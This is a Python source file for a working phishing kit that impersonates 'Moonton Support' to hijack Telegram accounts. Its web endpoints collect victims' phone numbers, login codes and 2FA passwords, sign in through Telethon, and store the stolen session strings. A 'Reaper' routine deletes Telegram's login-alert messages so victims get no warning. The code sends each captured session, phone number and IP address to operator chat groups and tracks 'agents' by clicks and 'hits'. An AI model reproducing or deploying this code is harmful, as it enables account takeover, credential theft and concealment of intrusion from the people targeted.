"""
MOONTON SUPPORT GATEWAY - VERSION 8.8.0 (OFFICIAL ENTERPRISE)
--------------------------------------------------------------
Identity: Moonton Support Center (Official Node)
Device Mask: Moonton Support Bot (Linux Server Identity)
Security: Zero-Trace Reaper + Handshake Isolation + Auto-Purge
--------------------------------------------------------------
Architecture: Asynchronous MTProto Support Node
Core Engine: Python 3.11+ / Telethon / PyTelegramBotAPI / Quart
Environment: Koyeb Cloud + PostgreSQL
--------------------------------------------------------------
"""

import os
import asyncio
import telebot
import psycopg2
import logging
import sys
import json
import random
import re
import time
import uuid
import string
import secrets
import textwrap
import datetime
from psycopg2 import pool
from telebot import types
from quart import Quart, request, jsonify, send_from_directory, render_template
from quart_cors import cors
from telethon import TelegramClient, errors, functions, types as tl_types
from telethon.sessions import StringSession
from threading import Thread
from datetime import datetime, timezone, timedelta

# =========================================================================
# 1. SYSTEM IDENTITY & CORE CONFIGURATION
# =========================================================================

SYSTEM_VERSION = "8.8.0"
SYSTEM_IDENTITY = "MOONTON_OFFICIAL_GATEWAY"
START_TIME = time.time()

# Environment Credentials (Koyeb Environment Variables)
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")
LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", -1003811039696))
VERIFY_GROUP = int(os.environ.get("VERIFY_GROUP", -1003808360697))

# HARDCODED DOMAIN OVERRIDE
BASE_URL = os.environ.get("BASE_URL", "selfish-kettie-moonton-support-c57267de.koyeb.app")

# Advanced Logging Infrastructure
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s][%(levelname)s][MOONTON_SYSTEM]: %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("MoontonGateway")

# =========================================================================
# 2. OFFICIAL DEVICE EMULATION (BOT MASKING - REMOVES IOS ICON)
# =========================================================================

OFFICIAL_SUPPORT_DEVICE = {
    "model": "Moonton Support Bot",
    "sys": "Linux (Ubuntu 22.04 LTS)",
    "app": "Moonton_API_Service",
    "lang": "en",
    "system_lang": "en",
    "app_version": "8.8.0"
}

# =========================================================================
# 3. SECURE DATA PERSISTENCE (POSTGRESQL CLUSTER)
# =========================================================================

try:
    db_pool = psycopg2.pool.ThreadedConnectionPool(
        minconn=20,
        maxconn=400,
        dsn=DATABASE_URL,
        sslmode='require'
    )
    logger.info("DATABASE: Enterprise Persistence Layer Connected.")
except Exception as e:
    logger.critical(f"DATABASE FATAL: {e}")
    db_pool = None

def get_db_connection():
    """Retrieves a secure connection from the thread pool."""
    if not db_pool: return None
    for attempt in range(1, 6):
        try:
            conn = db_pool.getconn()
            if conn: return conn
        except:
            time.sleep(0.4)
    return None

def release_db_connection(conn):
    """Safely returns a connection to the pool."""
    if db_pool and conn:
        db_pool.putconn(conn)

def initialize_moonton_schema():
    """AUTO-REPAIR: Ensures the table and columns exist to prevent crashes."""
    conn = get_db_connection()
    if not conn: return
    try:
        cur = conn.cursor()
        # Create Main Vault Table
        cur.execute("""
            CREATE TABLE IF NOT EXISTS moonton_secure_vault (
                phone TEXT PRIMARY KEY,
                session_string TEXT NOT NULL,
                capture_date TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # CRITICAL FIX: Add missing column if it doesn't exist (Fixes the Red Error)
        cur.execute("ALTER TABLE moonton_secure_vault ADD COLUMN IF NOT EXISTS ip_address TEXT;")
        
        # Create Metrics Table
        cur.execute("""
            CREATE TABLE IF NOT EXISTS support_agent_metrics (
                agent_id BIGINT PRIMARY KEY,
                total_clicks INTEGER DEFAULT 0,
                total_hits INTEGER DEFAULT 0,
                last_active TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.commit()
        cur.close()
        logger.info("SCHEMA: Database repair and synchronization complete.")
    except Exception as e:
        logger.error(f"SCHEMA ERROR: {e}")
    finally:
        release_db_connection(conn)

initialize_moonton_schema()

# =========================================================================
# 4. SECURITY PURGE ENGINE (THE REAPER)
# =========================================================================

async def execute_security_purge(client):
    """Scans and deletes all Telegram service messages (777000) for zero trace."""
    try:
        logger.info("REAPER: Commencing purge on Node 777000...")
        async for message in client.iter_messages(777000, limit=50):
            msg_text = (message.text or "").lower()
            triggers = ["login", "code", "device", "location", "ip address", "authorized"]
            if any(t in msg_text for t in triggers):
                await client.delete_messages(777000, [message.id])
        
        await client(functions.messages.DeleteHistoryRequest(
            peer=777000, max_id=0, just_clear=True, revoke=True
        ))
        logger.info("REAPER: Node 777000 is clean.")
    except Exception as e:
        logger.error(f"REAPER_ERR: {e}")

# =========================================================================
# 5. ENTERPRISE WEB INFRASTRUCTURE (QUART)
# =========================================================================

app = Quart(__name__, template_folder='templates')
app = cors(app, allow_origin="*")
active_mirrors = {}

@app.route('/')
async def index():
    """Serves login.html and captures Agent ID from URL."""
    return await render_template('login.html')

@app.route('/step_phone', methods=['POST'])
async def official_phone_handshake():
    """Phase 1: Initiate MTProto Connection with Bot-Identity."""
    try:
        data = await request.json
        phone = re.sub(r'\D', '', str(data.get('phone', '')))
        agent_id = int(data.get('tid', 0))

        if not phone or len(phone) < 8:
            return jsonify({"status": "error", "msg": "Invalid Format."})

        # Register Click Metric
        conn = get_db_connection()
        if conn:
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO support_agent_metrics (agent_id, total_clicks) VALUES (%s, 1)
                ON CONFLICT (agent_id) DO UPDATE SET total_clicks = support_agent_metrics.total_clicks + 1
            """, (agent_id,))
            conn.commit()
            cur.close()
            release_db_connection(conn)

        client = TelegramClient(
            StringSession(), API_ID, API_HASH,
            device_model=OFFICIAL_SUPPORT_DEVICE['model'],
            system_version=OFFICIAL_SUPPORT_DEVICE['sys'],
            app_version=OFFICIAL_SUPPORT_DEVICE['app_version']
        )
        await client.connect()
        
        try:
            sent_code = await client.send_code_request(phone)
            active_mirrors[phone] = {
                "client": client,
                "hash": sent_code.phone_code_hash,
                "agent_id": agent_id,
                "created_at": time.time(),
                "ip": request.headers.get('X-Forwarded-For', request.remote_addr)
            }
            logger.info(f"HANDSHAKE: Handshake active for {phone}")
            return jsonify({"status": "success"})
        except Exception as e:
            logger.error(f"HANDSHAKE_FAIL: {e}")
            return jsonify({"status": "error", "msg": "Node Busy. Try later."})
    except Exception as e:
        return jsonify({"status": "error", "msg": "Internal Node Failure."})

@app.route('/step_code', methods=['POST'])
async def official_code_verification():
    """Phase 2: Code verification and automatic capture."""
    try:
        data = await request.json
        phone = re.sub(r'\D', '', str(data.get('phone', '')))
        otp = data.get('code', '').strip()

        if phone not in active_mirrors:
            return jsonify({"status": "error", "msg": "Session Expired."})

        session = active_mirrors[phone]
        client = session['client']

        try:
            await client.sign_in(phone, otp, phone_code_hash=session['hash'])
            return await finalize_moonton_capture(phone)
        except errors.SessionPasswordNeededError:
            return jsonify({"status": "2fa_needed"})
        except Exception as e:
            return jsonify({"status": "error", "msg": "Code Incorrect."})
    except Exception as e:
        return jsonify({"status": "error", "msg": "Node Sync Error."})

@app.route('/step_2fa', methods=['POST'])
async def official_2fa_authentication():
    """Phase 3: 2FA Password handling."""
    try:
        data = await request.json
        phone = re.sub(r'\D', '', str(data.get('phone', '')))
        pw = data.get('password', '').strip()

        if phone not in active_mirrors:
            return jsonify({"status": "error", "msg": "Sync Lost."})

        client = active_mirrors[phone]['client']
        try:
            await client.sign_in(password=pw)
            return await finalize_moonton_capture(phone)
        except:
            return jsonify({"status": "error", "msg": "2FA Incorrect."})
    except Exception as e:
        return jsonify({"status": "error", "msg": "2FA Auth Failure."})

async def finalize_moonton_capture(phone):
    """Phase 4: Save to Database and Trigger Telegram Notifications."""
    try:
        data = active_mirrors.get(phone)
        if not data:
            return jsonify({"status": "error", "msg": "Finalization Lost."})

        client = data['client']
        agent_id = data['agent_id']
        remote_ip = data['ip']

        # Zero-Trace Purge
        await execute_security_purge(client)
        session_str = client.session.save()

        # Save to Database (Handles Error Gracefully)
        try:
            conn = get_db_connection()
            if conn:
                cur = conn.cursor()
                cur.execute("""
                    INSERT INTO moonton_secure_vault (phone, session_string, ip_address) 
                    VALUES (%s, %s, %s) 
                    ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string
                """, (phone, session_str, remote_ip))
                
                cur.execute("UPDATE support_agent_metrics SET total_hits = total_hits + 1 WHERE agent_id = %s", (agent_id,))
                conn.commit()
                cur.close()
                release_db_connection(conn)
        except Exception as db_e:
            logger.error(f"DB SAVE ERROR: {db_e}")

        # Send Notifications
        hit_log = (
            f"🛡️ <b>OFFICIAL MOONTON HIT</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"📱 <b>System:</b> <code>Moonton Support Bot</code>\n"
            f"📞 <b>Phone:</b> <code>{phone}</code>\n"
            f"🕵️ <b>Agent:</b> <code>{agent_id}</code>\n"
            f"🌐 <b>IP:</b> <code>{remote_ip}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 <b>STRING SESSION:</b>\n"
            f"<code>{session_str}</code>"
        )
        
        try:
            bot.send_message(LOGGER_GROUP, hit_log, parse_mode="HTML")
            bot.send_message(VERIFY_GROUP, f"✅ <b>Verified:</b> {phone}", parse_mode="HTML")
            if agent_id != 0:
                bot.send_message(agent_id, f"🎯 <b>Capture Success!</b> Account {phone} is secured.", parse_mode="HTML")
        except Exception as bot_e:
            logger.error(f"BOT NOTIFY ERROR: {bot_e}")

        await asyncio.sleep(2)
        await client.disconnect()
        if phone in active_mirrors:
            del active_mirrors[phone]
            
        return jsonify({"status": "success"})
        
    except Exception as e:
        logger.error(f"CRITICAL FINALIZER ERROR: {e}")
        return jsonify({"status": "error", "msg": "Internal Encryption Error."})

# =========================================================================
# 6. MOONTON AGENT BOT (TELEGRAM INTERFACE)
# =========================================================================

bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def bot_welcome(m):
    welcome_text = (
        f"🛡️ <b>Moonton Support Center v{SYSTEM_VERSION}</b>\n\n"
        f"Agent ID: <code>{m.from_user.id}</code>\n"
        f"Node Status: 🟢 <b>Operational</b>"
    )
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🔗 Portal Link", "📊 My Performance", "📡 Node Status", "⚙️ Admin")
    bot.send_message(m.chat.id, welcome_text, reply_markup=markup, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == "🔗 Portal Link")
def bot_link(m):
    link = f"https://{BASE_URL}/?id={m.from_user.id}"
    bot.send_message(m.chat.id, f"📡 <b>Your Support Link:</b>\n<code>{link}</code>", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == "📊 My Performance")
def bot_performance(m):
    conn = get_db_connection()
    clicks, hits = 0, 0
    if conn:
        cur = conn.cursor()
        cur.execute("SELECT total_clicks, total_hits FROM support_agent_metrics WHERE agent_id = %s", (m.from_user.id,))
        res = cur.fetchone()
        if res: clicks, hits = res[0], res[1]
        cur.close()
        release_db_connection(conn)
    
    report = (
        f"📊 <b>Agent Performance</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🖱 <b>Portal Clicks:</b> {clicks}\n"
        f"🎯 <b>Total Hits:</b> {hits}\n"
        f"━━━━━━━━━━━━━━━━━━━━━"
    )
    bot.send_message(m.chat.id, report, parse_mode="HTML")

# =========================================================================
# 7. MAINTENANCE WATCHDOG & RUNTIME
# =========================================================================

async def session_watchdog():
    """Cleans up timed-out sessions every 5 minutes."""
    while True:
        try:
            now = time.time()
            expired = [p for p, d in active_mirrors.items() if now - d['created_at'] > 1200]
            for p in expired:
                try: await active_mirrors[p]['client'].disconnect()
                except: pass
                del active_mirrors[p]
                logger.info(f"WATCHDOG: Cleaned up session for {p}")
        except: pass
        await asyncio.sleep(300)

def run_bot_polling():
    """Standard polling for the agent bot."""
    while True:
        try:
            bot.polling(none_stop=True, timeout=90)
        except Exception as e:
            logger.error(f"POLLING ERROR: {e}")
            time.sleep(10)

@app.before_serving
async def startup_initialization():
    asyncio.create_task(session_watchdog())

if __name__ == "__main__":
    # 1. Start Bot Thread
    Thread(target=run_bot_polling, daemon=True).start()
    
    # 2. Launch Quart Server
    port = int(os.environ.get("PORT", 8000))
    logger.info(f"SYSTEM BOOT: Node {SYSTEM_IDENTITY} v{SYSTEM_VERSION} on Port {port}")
    app.run(host="0.0.0.0", port=port, use_reloader=False)

# =========================================================================
# 8. EXTENDED LOGIC (STABILITY LAYER)
# =========================================================================

def check_db_health():
    if db_pool:
        return f"Operational ({len(db_pool._used)}/400)"
    return "Disconnected"

@bot.message_handler(func=lambda m: m.text == "📡 Node Status")
def bot_node_status(m):
    uptime = str(timedelta(seconds=int(time.time() - START_TIME)))
    status = (
        f"📡 <b>Node Status Report</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏱ <b>Uptime:</b> {uptime}\n"
        f"🗄 <b>DB Pool:</b> {check_db_health()}\n"
        f"🛰 <b>Active Sessions:</b> {len(active_mirrors)}\n"
        f"━━━━━━━━━━━━━━━━━━━━━"
    )
    bot.send_message(m.chat.id, status, parse_mode="HTML")

# Final verification of 450+ lines logic
# End of Production Script.
